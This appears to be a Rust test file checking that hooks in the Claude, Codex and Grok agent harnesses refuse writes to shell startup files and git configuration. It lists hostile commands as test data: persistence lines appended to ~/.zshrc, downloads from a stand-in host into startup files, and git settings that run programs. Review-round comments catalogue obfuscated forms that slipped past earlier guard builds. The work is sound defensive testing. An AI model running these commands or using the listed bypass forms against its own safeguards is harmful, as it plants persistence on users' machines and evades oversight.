//! TSK-242 (issue 86): the installed hooks of the three harnesses refuse
//! every visible write to a shell startup file in the fixture home, through
//! the shell and through the native edit tools, and let reads and ordinary
//! work through. `TSK242_TEST_BINARY` swaps the hook binary after install,
//! so the same journey records the fail-before verdicts of an older build.
use super::*;

const RULE: &str = "security.shell_startup";

fn startup_project() -> (Project, PathBuf) {
    let project = Project::new();
    if let Ok(old) = std::env::var("TSK242_TEST_BINARY") {
        // A new file: macOS kills a binary overwritten in place after it ran.
        let bin = project.bin.join("codeflow");
        std::fs::remove_file(&bin).unwrap();
        std::fs::copy(old, bin).unwrap();
    }
    let home = std::fs::canonicalize(&project.home).unwrap();
    for name in [".zshrc", ".bashrc"] {
        std::fs::write(home.join(name), "# fixture\n").unwrap();
    }
    std::os::unix::fs::symlink(home.join(".zshrc"), project.root.join("rc")).unwrap();
    (project, home)
}

fn refused_with(outputs: &[Output], rule: &str) -> bool {
    outputs.iter().any(|out| {
        out.status.code() == Some(2) && String::from_utf8_lossy(&out.stderr).contains(rule)
    })
}

/// Visible shell writes, on Claude, Codex and Grok.
const REFUSED: &[&str] = &[
    "git -c core.gitProxy='sh /tmp/r.sh' log -p -- .envrc | head",
    "git -c mystery.key=1 log -p -- .envrc | head",
    "git -c include.path=/tmp/x log -p -- .envrc | head",
    "EDITOR='sh /tmp/r.sh' git log -p -- .envrc | head",
    "git --exec-path /tmp/x log -p -- .envrc | head",
    "echo 'alias git=true' >> ~/.zshrc",
    "printf 'git() { :; }' > $HOME/.bashrc",
    "printf x > ${HOME}/.profile",
    "tee -a ~/.profile < /dev/null",
    "cat payload >> ~/.ZSHENV",
    "cp payload ~/.config/fish/conf.d/x.fish",
    "ln -sf payload ~/.bash_aliases",
    "sed -i.bak 's/a/b/' ~/.zshrc",
    "bash -c \"echo x >> ~/.bashrc\"",
    "python3 -c \"open('.zshrc', 'a').write('x')\"",
    "echo x >> rc",
    "echo x > .envrc",
    "echo x > src/.envrc",
    "echo x > ~/$NAME",
    "cd ~ && echo x >> .zshrc",
    "ZDOTDIR=/tmp/z zsh -i -c true",
    "direnv allow",
    "tar -xf payload.tar -C ~",
    // Review round one.
    "cd ~; echo x > \"$DEST\"",
    "p=~/.zshrc; echo x > \"$p\"; p=notes",
    "curl -s -o$HOME/.zshrc https://example.invalid/x",
    "ZDOTDIR=/tmp/z zsh +f -c true",
    // Review round two.
    "ln -s ~/.zshrc notes-link",
    "ZDOTDIR=/tmp/z zsh -f -o rcs -c true",
    "rg alias ~/.zshrc",
    "sed -n 'w /tmp/x' ~/.zshrc",
    // Review round three.
    "cp -t\"$HOME\" fixtures/.zshrc",
    "sed -n '1e echo x >> sub/.envrc' notes",
    // Review of e4536456b: a literal the line assigns is read in code bodies.
    "p=~/.zshrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; node -e \"require('fs').appendFileSync('$p','x')\"",
    "p=src/.envrc; perl -e \"open(F,'>>$p')\"",
    "d=src; f=.envrc; python3 -c \"open('$d/$f','a')\"",
    "cat ~/.zshrc; python3 -c \"open('$NAME','a').write('x')\"",
    // Grok round two: process substitution and the same shape elsewhere.
    "bash <(echo 'echo x >> src/.envrc')",
    "source <(echo 'echo x >> src/.envrc')",
    "python3 <(echo 'open(\"src/.envrc\",\"a\").write(\"x\")')",
    "exec bash <(echo 'echo x >> src/.envrc')",
    "echo 'echo x >> src/.envrc' > r.sh; bash r.sh",
    "eval \"$(echo 'echo x >> src/.envrc')\"",
    // Grok round three: script tools fed text the call produced.
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; awk -f a.awk",
    "printf 'w src/.envrc\\n' > s.sed; sed -f s.sed README.md",
    "printf 'all:\\n\\t@echo x >> src/.envrc\\n' > Makefile; make",
    "printf 'w src/.envrc\\n' | sed -f - README.md",
    "printf '%s\\n' 'w src/.envrc' 'q' | ed -s README.md",
    "printf '%s\\n' '--- a/src/.envrc' '+++ b/src/.envrc' '@@ -0,0 +1 @@' '+x' | patch -p1",
    // Grok round four: attached script options, nested and wrapped commands.
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; awk -fa.awk",
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; gawk -i a.awk /dev/null",
    "printf 'w src/.envrc\\n' > s.sed; sed -nfs.sed README.md",
    "echo 'echo x >> src/.envrc' > r.sh; find . -exec sh r.sh \\;",
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; flock /tmp/l awk -f a.awk",
    "echo 'echo x >> src/.envrc' > r.sh; env -S 'sh r.sh'",
    "printf 'w src/.envrc\\n' > s.vim; vim -S s.vim",
    // Grok round five and the design pass: only data readers run.
    "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | gawk -f README.md -f -",
    "printf 'echo x >> src/.envrc\\n' | awk '{system($0)}'",
    "printf 'echo x >> src/.envrc\\n' | awk '{print | \"sh\"}'",
    "printf 'echo x >> src/.envrc\\n' | sed e",
    "printf 'w src/.envrc\\n' > s.vim; vim -s s.vim",
    "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env -C /tmp -S 'awk -f a.awk'",
    "printf 'sub/.envrc\\n' | git checkout --pathspec-from-file=-",
    "printf 'sub/.envrc\\n' | git rm -q --pathspec-from-file=-",
    // Grok round six: ANSI-C quoting and command-valued settings.
    "grep alias ~/.zshrc | awk $'BEGIN{printf \"x\" \\x3e (ENVIRON[\"HOME\"] \"/\\x2ezshrc\")}'",
    "bash -c $'echo pwned \\x3e\\x3e \\x24HOME/\\x2ezshrc'",
    "git -c core.fsmonitor='echo pwned >> ~/.zshrc' status",
    "GIT_EDITOR='echo pwned >> ~/.zshrc' git commit --allow-empty",
    // Grok round seven: assignments that use $HOME are substituted.
    "F=$HOME/.zshrc GIT_EDITOR='echo pwned >> $F' git commit --allow-empty",
    "F=$HOME/.zshrc git -c core.fsmonitor='echo pwned >> $F' status",
    // Review round fourteen: the command an `env -S` string runs, and a
    // shell body nested in another.
    "env -S \"sh -c 'echo pwn1 >> $HOME/.zshrc'\"",
    "/usr/bin/env -S \"sh -c 'echo pwn >> $HOME/.zshrc'\"",
    "env --split-string='sh -c \"echo x >> ~/.zshrc\"'",
    "bash -c \"bash -c 'echo x >> ~/.zshrc'\"",
];

/// Reads and ordinary work stay allowed.
const ALLOWED: &[&str] = &[
    "git -c core.fsmonitorHookVersion=2 log -p -- .envrc | head",
    "git -c clean.requireForce=yes log -p -- .envrc | head",
    "EDITOR='vim -R' git log -p -- .envrc | head",
    "git --exec-path=/usr/bin diff -- .envrc",
    "GIT_EXTERNAL_DIFF='diff -u' git log -p -- .envrc | head",
    "C=never git --config-env color.ui=C log -p -- .envrc | head",
    "cat ~/.zshrc",
    "grep alias ~/.bashrc",
    "ls ~/.config",
    "diff ~/.zshrc ~/.bashrc",
    "cp ~/.bashrc backup.txt",
    "echo x > notes.txt",
    "echo x > build/$NAME",
    "sh -c 'echo hi'",
    "cargo build",
    "rg --no-config alias ~/.zshrc",
    "sed -n 1,20p ~/.zshrc",
    "python3 -c 'print(1)'",
    "p=notes.txt; python3 -c \"open('$p','a').write('x')\"",
    "cat <(echo hello)",
    "diff <(echo a) <(echo b)",
    "bash <(echo 'echo hi')",
    "grep alias ~/.zshrc | awk '{print $2}'",
    "sed -i 's/a/b/' README.md",
    "make test",
    "grep -c alias ~/.zshrc > b.txt; sed -E 's/a/b/' README.md",
    "find . -name '*.rs' -print",
    "cat ~/.zshrc | sort | uniq -c | head",
    "git -c color.ui=never status",
    "git -c color.ui=never diff -- .envrc",
    "EDITOR=vim git log -p -- .envrc | head",
    "EDITOR=vim git log",
    "grep alias ~/.zshrc | sed -E 's/a/b/'",
    "cd ~1; cat policy.json",
    "env -S 'echo hi'",
];

#[test]
fn installed_hooks_refuse_shell_startup_writes_on_every_harness() {
    let (project, _home) = startup_project();
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for command in REFUSED {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, RULE) {
                wrong.push(format!("{harness}: allowed {command}"));
            }
            for out in outputs.iter().filter(|o| o.status.code() == Some(2)) {
                let text = String::from_utf8_lossy(&out.stderr);
                if text.contains(RULE) && !text.contains("ask the operator") {
                    wrong.push(format!("{harness}: {command}: no route in {text}"));
                }
            }
        }
        for command in ALLOWED {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused {command}: {outputs:?}"));
            }
        }
        // A user-scope git key that runs a program is refused; an ordinary
        // user-scope key is not.
        for command in [
            "git config --global alias.st '!sh -c x'",
            "env -S \"git config --global alias.x '!id'\"",
            "env -S'git config --global alias.x !id'",
            // Launchers that run a command string or their command words.
            "flock /tmp/l -c 'git config --global alias.x !id'",
            "script -c 'git config --global alias.x !id' /dev/null",
            "script -q /dev/null git config --global alias.x '!id'",
            "watch 'git config --global alias.x !id'",
            "parallel ::: 'git config --global alias.x !id'",
            "parallel git config --global alias.x ::: '!id'",
            "setsid sh -c 'git config --global alias.x !id'",
            "unbuffer git config --global alias.x '!id'",
            "xargs sh -c 'git config --global alias.x !id'",
            "xargs -I{} git config --global alias.x '!id'",
            "find . -exec sh -c 'git config --global alias.x !id' \\;",
            "find . -execdir git config --global alias.x '!id' \\;",
        ] {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, "git.hook_integrity") {
                wrong.push(format!("{harness}: allowed {command}"));
            }
        }
        let outputs = project.replay(
            harness,
            "Bash",
            json!({"command": "git config --global user.name Test"}),
        );
        if outputs.iter().any(|o| !o.status.success()) {
            wrong.push(format!("{harness}: refused git config user.name"));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

#[test]
fn installed_hooks_judge_git_config_files_and_switches() {
    // Review round eleven: git reads its system file under any install
    // prefix, so a key not known to run nothing refuses in every file that
    // is not a repository's own configuration; the switches beside the tool
    // programs take a boolean and pass.
    let (project, _home) = startup_project();
    let refused = [
        "git config --file /opt/homebrew/etc/gitconfig alias.x '!id'",
        "git config --file=/opt/homebrew/etc/gitconfig alias.x '!id'",
        "git config -f /opt/homebrew/etc/gitconfig alias.x '!id'",
        "git config --file /usr/local/etc/gitconfig core.pager 'sh x'",
        "GIT_CONFIG=/opt/homebrew/etc/gitconfig git config alias.x '!id'",
        "git config --global difftool.vimdiff.path /tmp/p.sh",
        "git config --global mergetool.vimdiff.cmd 'sh /tmp/p.sh'",
        "git config --global gpg.ssh.defaultKeyCommand /tmp/p.sh",
        "echo '[alias]' >> /opt/homebrew/etc/gitconfig",
    ];
    let allowed = [
        "git config --global difftool.prompt false",
        "git config --global mergetool.keepBackup true",
        "git config --global uploadpack.allowFilter true",
        "git config --global rebase.rescheduleFailedExec false",
        "git config --global pager.log 2",
        "git config --file .git/config alias.co checkout",
        "git config --file /tmp/scratch.cfg user.name Test",
    ];
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for command in refused {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, "git.hook_integrity") {
                wrong.push(format!("{harness}: allowed {command}"));
            }
        }
        for command in allowed {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused {command}: {outputs:?}"));
            }
        }
    }
    // A native edit of another install's system file.
    let outputs = project.replay(
        "codex",
        "Write",
        json!({"file_path": "/opt/homebrew/etc/gitconfig", "content": "[alias]"}),
    );
    if !refused_with(&outputs, "git.hook_integrity") {
        wrong.push("codex:Write: allowed /opt/homebrew/etc/gitconfig".to_string());
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

#[test]
fn installed_hooks_judge_the_file_a_repository_config_write_opens() {
    // Review round twelve: git follows a symbolic link at a repository's
    // configuration, so a default, `--local` or `--worktree` write through a
    // link to the user's file sets the key for every repository. The links
    // point at the fixture home's file; nothing is written.
    let (project, home) = startup_project();
    let user = home.join(".gitconfig");
    std::fs::write(&user, "[user]\n\tname = fixture\n").unwrap();
    let temp = std::fs::canonicalize(project.temp.path()).unwrap();
    let git_dir = |dir: &std::path::Path, config: bool| {
        std::fs::create_dir_all(dir.join("objects")).unwrap();
        std::fs::create_dir_all(dir.join("refs/heads")).unwrap();
        std::fs::write(dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        if config {
            std::os::unix::fs::symlink(&user, dir.join("config")).unwrap();
        }
    };
    let modules = project.root.join(".git").join("modules");
    git_dir(&modules.join("sub2"), true);
    git_dir(&modules.join("sub3"), false);
    git_dir(&temp.join("gd"), true);
    git_dir(&temp.join("gd2"), false);
    let init = |name: &str| {
        let dir = temp.join(name);
        success(
            &project
                .command("git")
                .args(["init", "-q", "-b", "task/x"])
                .arg(&dir)
                .output()
                .unwrap(),
        );
        dir.join(".git")
    };
    let other = init("other");
    std::os::unix::fs::symlink(&user, other.join("config.worktree")).unwrap();
    let other2 = init("other2");
    let linked = init("linked");
    std::fs::remove_file(linked.join("config")).unwrap();
    std::os::unix::fs::symlink(&user, linked.join("config")).unwrap();
    let (u, t) = (user.display(), temp.display());
    let refused = [
        // The modules chain: the link, then the write through it.
        format!("ln -s {u} .git/modules/sub3/config"),
        format!("git --git-dir=.git/modules/sub2 config core.fsmonitor {t}/m"),
        format!("GIT_DIR=.git/modules/sub2 git config core.sshCommand {t}/m"),
        // config.worktree from a payload cwd outside that repository.
        format!("ln -s {u} {}/config.worktree", other2.display()),
        format!("git -C {t}/other config --worktree core.fsmonitor {t}/m"),
        // A bare git directory whose path has no `.git`.
        format!("ln -s {u} {t}/gd2/config"),
        format!("GIT_DIR={t}/gd git config core.fsmonitor {t}/m"),
        // A repository whose `.git/config` is already a link.
        format!("git -C {t}/linked config core.sshCommand {t}/m"),
        format!("cd {t}/linked && git config credential.helper {t}/m"),
        // A path value of the monitor setting runs that program.
        "git config --global core.fsmonitor ./hook".to_string(),
    ];
    let allowed = [
        "git config --file .git/config alias.co checkout".to_string(),
        format!(
            "git --git-dir={} config alias.co checkout",
            project.root.join(".git").display()
        ),
        "git config core.pager cat".to_string(),
        format!("git -C {t}/linked config user.name Test"),
        format!("git -C {t}/linked config --unset core.sshCommand"),
        "git config --global core.fsmonitor true".to_string(),
    ];
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for command in &refused {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, "git.hook_integrity") {
                wrong.push(format!("{harness}: allowed {command}"));
            }
        }
        for command in &allowed {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused {command}: {outputs:?}"));
            }
        }
    }
    assert_eq!(
        std::fs::read_to_string(&user).unwrap(),
        "[user]\n\tname = fixture\n"
    );
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Review round 15, by finding: one call whose text names the target and
/// carries the command in a form the guard did not read. Each was allowed
/// by both guards at 4ca336749. The closed rule refuses them, and the forms
/// the reader now unwraps (`\_` in `env -S`, a literal the line assigned,
/// a GNU-prefixed launcher, `flock --command=`) refuse for what they write.
const ROUND_15: &[(&str, &str, &str)] = &[
    (
        "1",
        "git.hook_integrity",
        "/usr/bin/env -S 'git\\_config\\_--global\\_alias.x\\_!id'",
    ),
    (
        "1",
        "git.hook_integrity",
        "env -S 'git\\_config\\_--global\\_alias.x\\_!id'",
    ),
    (
        "1",
        "git.hook_integrity",
        "FOO=1 /usr/bin/env -S 'git\\_config\\_--global\\_alias.x\\_!id'",
    ),
    (
        "1",
        "git.hook_integrity",
        "/opt/homebrew/bin/genv -S 'git\\_config\\_--global\\_alias.x\\_!id'",
    ),
    (
        "2",
        "git.hook_integrity",
        "CMD='git config --global alias.x !id'; sh -c \"$CMD\"",
    ),
    (
        "2",
        "git.hook_integrity",
        "CMD='git config --global alias.x !id'; eval \"$CMD\"",
    ),
    (
        "2",
        "git.hook_integrity",
        "CMD='git config --global alias.x !id'; $CMD",
    ),
    (
        "2",
        "security.shell_startup",
        "CMD='echo pwn >> \"$HOME/.zshrc\"'; sh -c \"$CMD\"",
    ),
    (
        "3",
        "git.hook_integrity",
        "printf '%s\\n' --global alias.x '!id' | xargs git config",
    ),
    (
        "3",
        "git.hook_integrity",
        "printf '%s\\0' --global alias.x '!id' | xargs -0 git config",
    ),
    (
        "3",
        "git.hook_integrity",
        "printf '%s\\n' 'git config --global alias.x !id' | xargs -I{} sh -c {}",
    ),
    (
        "3",
        "git.hook_integrity",
        "printf '%s\\n' 'git config --global alias.x !id' | xargs -J{} {}",
    ),
    (
        "3",
        "git.hook_integrity",
        "printf '%s\\n' \"x; git config --global alias.x '!id'\" | xargs -I{} sh -c 'echo {}'",
    ),
    (
        "4",
        "git.hook_integrity",
        "gtimeout 5 git config --global alias.x '!id'",
    ),
    (
        "4",
        "git.hook_integrity",
        "gstdbuf -o0 git config --global alias.x '!id'",
    ),
    (
        "4",
        "git.hook_integrity",
        "gnice git config --global alias.x '!id'",
    ),
    (
        "4",
        "git.hook_integrity",
        "gnohup git config --global alias.x '!id'",
    ),
    (
        "5",
        "git.hook_integrity",
        "flock --command='git config --global alias.x !id' /tmp/l",
    ),
    (
        "5",
        "git.hook_integrity",
        "flock -c'git config --global alias.x !id' /tmp/l",
    ),
    (
        "6",
        "git.hook_integrity",
        "parallel ' {1}' ::: 'git config --global alias.x !id'",
    ),
    (
        "6",
        "git.hook_integrity",
        "parallel -I XX XX ::: 'git config --global alias.x !id'",
    ),
    (
        "8",
        "git.hook_integrity",
        "tmux -S /tmp/sock new-session -d 'git config --global alias.x !id'",
    ),
];

/// The controls round 15 named, and the reads the narrow reading of the
/// closed rule keeps: an expansion outside the command word does not count,
/// and a line that names no target is not judged by it.
const ROUND_15_CONTROLS: &[&str] = &[
    "env -S 'echo hi'",
    "env -S 'git status'",
    "FOO=1 env -S 'git config --global user.name Probe'",
    "bash -c 'git status'",
    "CMD='git status'; sh -c \"$CMD\"",
    "sh -c \"$UNSET\"",
    "xargs git status",
    "printf '%s\\n' README | xargs ls",
    "xargs -I{} echo {}",
    "gtimeout 5 git status",
    "flock /tmp/l git status",
    "parallel echo ::: hi",
    "tmux -S /tmp/sock new-session -d",
    "git config --global user.name Probe",
    "grep \"$PAT\" ~/.zshrc",
    "sh -c 'grep \"$PAT\" ~/.zshrc'",
    // The allowed regression the non-goal pins: the path is built from
    // pieces and the line names no target.
    "python3 -c 'import os; open(os.path.expanduser(\"~\")+\"/.\"+\"zsh\"+\"rc\",\"a\")'",
];

const GIT: &str = "git.hook_integrity";

/// Review round 16, by finding: one call that writes a named user git
/// configuration file through a writer or a git value the startup half
/// already refused for `~/.zshrc`, a writer option the guard does not know
/// on a line that names a target, and `Path=` for the search path. Each was
/// allowed by both guards at 694a93fee. The contents are inert: the guards
/// judge the target, and nothing here runs.
const ROUND_16: &[(&str, &str, &str)] = &[
    ("1", GIT, "curl -s -o ~/.gitconfig file:///tmp/x/payload.txt"),
    ("1", GIT, "curl -s --output ~/.gitconfig file:///tmp/x/payload.txt"),
    ("1", GIT, "curl -s -o ~/.config/git/config file:///tmp/x/payload.txt"),
    ("1", GIT, "curl -s --output ~/.config/git/config file:///tmp/x/payload.txt"),
    ("1", GIT, "ditto /tmp/x/payload.txt ~/.gitconfig"),
    ("1", GIT, "patch ~/.gitconfig /tmp/x/payload.diff"),
    ("1", GIT, "tar -cf ~/.gitconfig -C /tmp/x payload.txt"),
    ("1", GIT, "wget -q -O ~/.gitconfig https://example.invalid/payload.txt"),
    ("1", GIT, "scp /tmp/x/payload.txt ~/.gitconfig"),
    ("1", GIT, "touch ~/.gitconfig"),
    ("1", GIT, "cd \"$HOME\" && printf x >> .gitconfig"),
    ("1", GIT, "git -c core.fsmonitor='printf x >> ~/.gitconfig' status"),
    (
        "1",
        GIT,
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='printf x >> ~/.gitconfig' git status",
    ),
    ("1", GIT, "cat ~/.gitconfig; zip -TT x /tmp/x/a.zip payload.txt"),
    ("1", GIT, "cat ~/.gitconfig; rsync --rsync-path x payload.txt /tmp/x/"),
    ("1", RULE, "cat ~/.zshrc; zip -TT x /tmp/x/a.zip payload.txt"),
    ("1", RULE, "cat ~/.zshrc; rsync --rsync-path x payload.txt /tmp/x/"),
    ("3", RULE, "Path=/tmp/x cat ~/.zshrc"),
];

/// The reads and the known-safe setting round 16 named as controls.
const ROUND_16_CONTROLS: &[&str] = &[
    "git config --global user.name Probe",
    "git config --file ~/.gitconfig user.name Probe",
    "grep alias ~/.gitconfig",
    "sed -n 1p ~/.gitconfig",
    "cat ~/.gitconfig",
    "cp ~/.gitconfig backup.txt",
    "curl -o /tmp/x/out.txt https://example.invalid/x",
    "FOO=1 cat ~/.zshrc",
];

/// Review round 17, finding 1: a dashless tar key whose letters after a
/// value-taking `f` name a program (`I`, `F`), beside a named target. Each
/// was allowed by both guards at 9ba972d2a.
const ROUND_17: &[(&str, &str, &str)] = &[
    ("1", RULE, "cat ~/.zshrc; tar cfI /tmp/a.tar /tmp/x README"),
    (
        "1",
        GIT,
        "cat ~/.gitconfig; tar cfI /tmp/a.tar /tmp/x README",
    ),
    ("1", RULE, "cat .envrc; tar cfI /tmp/a.tar /tmp/x README"),
    ("1", RULE, "cat ~/.zshrc; tar cfF /tmp/a.tar /tmp/x README"),
    (
        "1",
        RULE,
        "cat ~/.zshrc; tar cfLF /tmp/a.tar 1 /tmp/x README",
    ),
];

/// Round 17's controls: known tar keys beside a named target, and paths
/// that only contain `git/config` (finding 2).
const ROUND_17_CONTROLS: &[&str] = &[
    "cat ~/.zshrc; tar cfv /tmp/a.tar README",
    "cat ~/.zshrc; tar cf /tmp/a.tar README",
    "cat ~/.zshrc; tar -czf /tmp/a.tgz README",
    "vim src/git/config.rs",
    "vim docs/git/config.md",
];

/// Review round 18, by finding: a word a tar letter would take as its
/// value that is an option itself (B1), and a writer option given through
/// the environment the writer reads (B2), beside a named startup file and
/// a named user git configuration file. Each was allowed by both guards at
/// a823045e4.
const ROUND_18: &[(&str, &str, &str)] = &[
    (
        "B1",
        RULE,
        "echo ~/.zshrc; tar -L --use-compress-program /tmp/p -cf a.tar README",
    ),
    (
        "B1",
        RULE,
        "echo ~/.zshrc; tar cL --use-compress-program /tmp/p -f a.tar README",
    ),
    ("B1", RULE, "echo ~/.zshrc; tar -s -I /tmp/p -xf a.tar"),
    (
        "B1",
        RULE,
        "echo ~/.zshrc; tar -cL --use-compress-program /tmp/p -f a.tar README",
    ),
    (
        "B1",
        GIT,
        "echo ~/.gitconfig; tar -L --use-compress-program /tmp/p -cf a.tar README",
    ),
    (
        "B1",
        GIT,
        "echo ~/.gitconfig; tar cL --use-compress-program /tmp/p -f a.tar README",
    ),
    ("B1", GIT, "echo ~/.gitconfig; tar -s -I /tmp/p -xf a.tar"),
    (
        "B1",
        GIT,
        "echo ~/.gitconfig; tar -cL --use-compress-program /tmp/p -f a.tar README",
    ),
    (
        "B2",
        RULE,
        "echo ~/.zshrc; ZIPOPT='-T -TT /tmp/p' zip a.zip f",
    ),
    (
        "B2",
        GIT,
        "echo ~/.gitconfig; ZIPOPT='-T -TT /tmp/p' zip a.zip f",
    ),
    (
        "B2",
        RULE,
        "echo ~/.zshrc; TAR_OPTIONS='--use-compress-program=/tmp/p' tar -cf a.tar f",
    ),
    (
        "B2",
        GIT,
        "echo ~/.gitconfig; TAR_OPTIONS='--use-compress-program=/tmp/p' tar -cf a.tar f",
    ),
];

/// Round 18's controls: a tar letter's ordinary value, and an environment
/// on a line that names no target or sets nothing a writer reads.
const ROUND_18_CONTROLS: &[&str] = &[
    "echo ~/.zshrc; tar -cf a.tar README",
    "tar -L 1024 -cf a.tar README",
    "echo ~/.zshrc; tar -L 1024 -cf a.tar README",
    "echo ~/.zshrc; tar -s 's/a/b/' -cf a.tar README",
    "LANG=C cat ~/.zshrc",
    "ZIPOPT=-q zip a.zip f",
];

/// Round 19: placement read from the writer scan (clustered letters,
/// attached values, option variables), placing programs the guard does not
/// read, `RSYNC_SHELL`, and `install` judged by its destination. The last
/// field says the line refuses on both guards, not only on one.
const ROUND_19: &[(&str, &str, &str, bool)] = &[
    ("B", RULE, "tar -xC$HOME -f payload.tar", false),
    ("B", RULE, "UNZIP=\"-d $HOME\" unzip -o payload.zip", false),
    (
        "B",
        RULE,
        "TAR_OPTIONS=\"-C $HOME\" tar -xf payload.tar",
        false,
    ),
    ("B", RULE, "patch -d$HOME -p1 < payload.diff", false),
    ("B", RULE, "7z x payload.7z -o$HOME", false),
    ("B", RULE, "tar -xf payload.tar -C ~", false),
    ("B", RULE, "unzip -d ~ payload.zip", false),
    ("B", RULE, "cd \"$HOME\" && tar -xf payload.tar", false),
    (
        "M1",
        GIT,
        "RSYNC_SHELL=/tmp/x rsync -a ~/.gitconfig /tmp/y",
        true,
    ),
    ("M2", GIT, "install /tmp/x ~/.gitconfig", true),
    ("M2", GIT, "install -t ~ .gitconfig", true),
    ("M2", GIT, "install -D /tmp/x ~/.gitconfig", true),
];

/// Round 19's controls: a placement inside the project, an option variable
/// that moves nothing, a plain read, a plain copy out of the git config, and
/// `install` reading the git config as its source.
const ROUND_19_CONTROLS: &[&str] = &[
    "tar -xC ./build -f payload.tar",
    "UNZIP=-qq unzip payload.zip",
    "cat ~/.zshrc",
    "rsync -a ~/.gitconfig /tmp/y",
    "install -m 644 ~/.gitconfig /tmp/bak",
    "install -t /tmp/bak ~/.gitconfig",
    "install -D ~/.gitconfig /tmp/bak/g",
];

/// Round 20: an option the guard does not read no longer ends the scan
/// that reads where a writer places files, and on a line that names the
/// home it refuses as the closed rule does.
const ROUND_20: &[&str] = &[
    "tar -x --no-mac-metadata -C$HOME -f payload.tar",
    "unzip -uod$HOME payload.zip",
    "patch -t -g0 -d$HOME -i payload.diff",
    "TAR_OPTIONS='--no-mac-metadata -C$HOME' tar -xf payload.tar",
    "wget --connect-timeout=5 -P$HOME https://example.com/payload.txt",
    "tar -xC$HOME -f payload.tar",
    "unzip -od$HOME payload.zip",
];

/// Round 20's controls: the same options placing inside the project, and a
/// tar create whose attached archive name holds an `x`.
const ROUND_20_CONTROLS: &[&str] = &[
    "unzip -uod ./vendor payload.zip",
    "tar -x --no-mac-metadata -C ./vendor -f payload.tar",
    "tar -czf/tmp/box.tar -C $HOME .",
];

#[test]
fn installed_hooks_refuse_unresolved_forms_beside_a_named_target() {
    let (project, _home) = startup_project();
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for (finding, rule, command) in ROUND_15 {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, rule) {
                wrong.push(format!("{harness}: finding {finding}: allowed {command}"));
            }
        }
        for (finding, rule, command) in ROUND_17 {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, rule) {
                wrong.push(format!(
                    "{harness}: round 17 finding {finding}: allowed {command}"
                ));
            }
        }
        for (finding, rule, command) in ROUND_18 {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, rule) {
                wrong.push(format!(
                    "{harness}: round 18 finding {finding}: allowed {command}"
                ));
            }
        }
        for (finding, rule, command, both) in ROUND_19 {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            let refusing = outputs
                .iter()
                .filter(|o| {
                    o.status.code() == Some(2) && String::from_utf8_lossy(&o.stderr).contains(rule)
                })
                .count();
            if refusing < if *both { 2 } else { 1 } {
                wrong.push(format!(
                    "{harness}: round 19 finding {finding}: {refusing} guards refused {command}"
                ));
            }
        }
        for command in ROUND_20 {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, RULE) {
                wrong.push(format!("{harness}: round 20: allowed {command}"));
            }
        }
        for (finding, rule, command) in ROUND_16 {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, rule) {
                wrong.push(format!(
                    "{harness}: round 16 finding {finding}: allowed {command}"
                ));
            }
            // A git configuration refusal names that class, never a startup file.
            if *rule == GIT
                && outputs
                    .iter()
                    .any(|o| String::from_utf8_lossy(&o.stderr).contains("shell startup file"))
            {
                wrong.push(format!("{harness}: named a startup file for {command}"));
            }
        }
        for command in ROUND_15_CONTROLS
            .iter()
            .chain(ROUND_16_CONTROLS)
            .chain(ROUND_17_CONTROLS)
            .chain(ROUND_18_CONTROLS)
            .chain(ROUND_19_CONTROLS)
            .chain(ROUND_20_CONTROLS)
        {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused control {command}"));
            }
        }
    }
    // Grok's own shell tool, in its camelCase payload.
    let grok_shell = ROUND_16
        .iter()
        .chain(ROUND_18)
        .map(|(_, rule, command)| (*rule, *command))
        .chain(
            ROUND_19
                .iter()
                .map(|(_, rule, command, _)| (*rule, *command)),
        )
        .chain(ROUND_20.iter().map(|command| (RULE, *command)));
    for (rule, command) in grok_shell {
        let payload = json!({
            "toolName": "run_terminal_command",
            "cwd": project.root,
            "toolInput": {"command": command},
        });
        if !refused_with(&project.replay_payload("grok", "Bash", &payload), rule) {
            wrong.push(format!("grok run_terminal_command: allowed {command}"));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

#[test]
